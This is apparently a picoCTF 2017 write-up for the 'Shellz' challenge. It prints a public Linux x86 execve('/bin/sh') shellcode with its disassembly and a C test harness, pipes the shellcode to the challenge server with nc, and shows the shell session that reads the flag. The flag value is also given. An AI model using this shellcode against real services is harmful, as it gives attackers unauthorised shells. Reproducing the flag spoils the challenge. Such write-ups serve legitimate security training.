# Shellz
---
### Question
You no longer have an easy thing to call, but you have more space. Program: shellz! Source. Connect on shell2017.picoctf.com:34621.

### HINTS

There is a bunch of preexisting shellcode already out there!

---
# Solution

It was time taking challenge I went to shell-strome website and keep trying different shellcodes. Then this [shellcode](http://shell-storm.org/shellcode/files/shellcode-811.php) was working. 

```bash
/*
Title:	Linux x86 execve("/bin/sh") - 28 bytes
Author:	Jean Pascal Pereira <pereira@secbiz.de>
Web:	http://0xffe4.org
Disassembly of section .text:

08048060 <_start>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80
*/
#include <stdio.h>
char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";
int main()
{
  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
  (*(void  (*)()) shellcode)();
}
```

I just copied the shellcode
```shell
"\x31\xc0\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89"
"\xe3\x89\xc1\x89\xc2\xb0\x0b"
"\xcd\x80\x31\xc0\x40\xcd\x80"
```

so just write this shellcode in one file. 
    ```
    \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
    ```
    
```python
python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"' > spirit
```

now just cat it out with the : shell2017.picoctf.com:34621

```bash
$cat spirit - | nc shell2017.picoctf.com 34621
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 40 bytes:
~whoami
shellz_2
~ls
flag.txt
shellz
shellz_no_aslr
xinetd_wrapper.sh
~cat flag.txt
f6f01bf0649b5aa5ec299bb51c8f8db4
```

If you are thinking why i used ```-``` then it's just used for concatenate files and print out the standard output.

I think we got the flag.
```
f6f01bf0649b5aa5ec299bb51c8f8db4
```
  Hope you liked it
   ~Thanks
   
   [@spiritedwolf](https://github.com/spiritedwolf)

---

